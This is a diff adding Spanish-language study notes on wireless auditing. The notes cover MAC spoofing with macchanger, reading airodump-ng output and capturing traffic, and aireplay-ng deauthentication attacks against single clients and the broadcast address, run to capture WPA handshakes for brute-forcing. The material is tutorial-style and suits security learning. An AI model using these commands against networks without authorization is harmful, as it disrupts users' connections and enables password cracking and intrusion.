@@ -8,7 +8,7 @@ presentes.
 ?$ ifconfig ---> listar interfaces de red 
 
 ?$ iwconfig 
-listar más interfaces de red, incluse algunas que no estan activas, dadas de bajas, etc. Estas
+listar más interfaces de red, incluye algunas que no estan activas, dadas de bajas, etc. Estas
 se habilitan para con los containers desplegados
 
 !TARJETAS DE RED
@@ -83,5 +83,123 @@ Para matar estos procesos conflictivos se pueden matar de 3 formas distintas
 Cuando paramos el modo monitor se recomienda es reinicar el servicio networking 
 
 ?$ /etc/init.d/networking restart
+
+Falsificar la direccion mac 
+
+MAc -----> Direccion unica de un dispositivo, como el dni
+
+Se conforma de 3 pares, siendo los 3 primeros el famoso OUI (Organization Unique Identifier) y los ultimos 3 el Network Controller
+Specific
+
+?$ macchanger -l 
+
+Listar lista de los OUI conocidos
+
+Por lo que podriamos usar los OUI para falsificar la mac de nuestro dispositivo
+
+?$ macchanger -l | grep -i "national security agency"
+8310 - 00:20:91 - J125, NATIONAL SECURITY AGENCY
+
+?$ macchanger --mac=00:20:91:da:af:91 {interfaz}
+
+(hexadecimal --> n (1 - 9) l (a - f))
+
+--> [ERROR] Could not change MAC: interface up or insufficient permissions: Device or resource busy
+
+Esto pasa porque la red wlan0mon esta dada de alta
+
+?$ ifconfig wlan0mon down
+
+?$ ifconfig wlan0mon up
+
+
+! AIRCRACK-NG 
+
+Es una suite (paquete de programas) de seguridad inalambrica. Es un analizador de paquetes de redes, recupera contraseñas WEB y 
+WPA/WPA2 asi como otro conjunto de  herramientas de auditorias inalambricas
+
+Las herramientas más utilizadas para la auditoría inalámbrica son:
+
+Aircrack-ng (descifra la clave de los vectores de inicio)
+Airodump-ng (escanea las redes y captura vectores de inicio)
+Aireplay-ng (inyecta tráfico para elevar la captura de vectores de inicio)
+Airmon-ng (establece la tarjeta inalámbrica en modo monitor, para poder capturar e inyectar vectores)
+
+?$ airodump-ng {interfaz}
+
+
+ BSSID              PWR  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID
+
+ E4:AB:89:3C:7F:C7  -29       31        1    0  11  130   WPA2 CCMP   PSK  colgatedeesta   
+
+Donde BSSID ----> MAC del router
+PWR ----> Power 
+#Data ---> Data
+#/s ----> por segundo
+CH -----> chanel
+MB ----> MegaBytes
+ENC ---> Encriptado
+CIPHER -----> parte del cifrado
+AUTH ----> Clave de autorizacion
+ESSID ----> Nombre de la red
+
+Channel hoppin es lo que hace la tarjeta de red para ir cambiando entre canales para asi encontrar redes
+
+CLIENTES 
+
+ BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes
+
+ CC:ED:DC:1F:22:61  74:EB:80:4D:64:64  -70    0 - 1e     0        1       
+
+BSSID ---> MAC del router al que se esta conectado
+STATION ---> MAC del dispositivo (celular, pc, tele, etc)
+PWR ---> Power
+RATE ---> Tasa de recepcion - Tase de retransmicion (se muestra la e si la red se encuentra con el QOS habilitado) 
+LOST ---> paquetes perdidos en los ultimos 10s
+FRAMES ---> numero de paquetes enviados por el cliente
+NOTES ---> Info adicional
+PROBES ---> Probe request, buscando un probe response de redes previas a las que se haya conectado en el pasado el dispositivo
+
+! Filtros con airodump-ng
+
+Filtrar por canales
+
+?$ airodump-ng -c {n°_channel} {interfaz}
+
+?$ airodump-ng --essid {name_essid} {interfaz}
+
+?$ airodump-ng --bssid {bssid} {interfaz}
+
+?$ airodump-ng --bssid {bssid} -w {file_name} {interfaz}
+
+Para hackear una red inalambrica, necesitamos ir guardando todo el trafico en un file para poder capturar la contraseña ya que 
+esta no va a estar en texto claro, si no cifrada con el CIPHER que tenga, posteriormente necesitariamos extraer el hash de la 
+clave cifrada para aplicar fuerza bruta, este es el porque se necesita la captura 
+
+El archivo que nos interesa de los que crea es el .cap, el que va a alojar el hash de la contraseña
+
+!HANDSHAKE
+
+Se genera en el momento en el que el usuario se reconecta a la red, ya que el usuario esta volviendo a proporcionar las credenciales
+de la conexion (claramente en texto no claro).
+
+De esta manera se pueden enviar paquetes al marco de deautenticacion del router para expulsar a los clientes de la red inalambrica
+Para hacerlo nos tenemos que enfocar en los clientes, si este es uno o son pocos lo que podemos hacer es un ataque de 
+deauthenticacion por mac
+
+?$ aireplay-ng -0 {n_paquetes} -e {name_essid} -c {mac_cliente} {interfaz}
+
+En caso contrario, si tuviesemos muchos usuarios podriamos hacer un ataque de deauthenticacion global
+
+?$ aireplay-ng -0 {n_paquetes} -e {name_essid} -c FF:FF:FF:FF:FF:FF {interfaz}
+o
+?$ aireplay-ng -0 {n_paquetes} -e {name_essid} {interfaz}
+
+Esto de FF:FF:FF:FF:FF:FF es la broadcast mac addres, de esta manera desconectariamos a todos los usuarios y con que uno se 
+reconecte, capturariamos el handshake.
+
+
+
+
 
 """
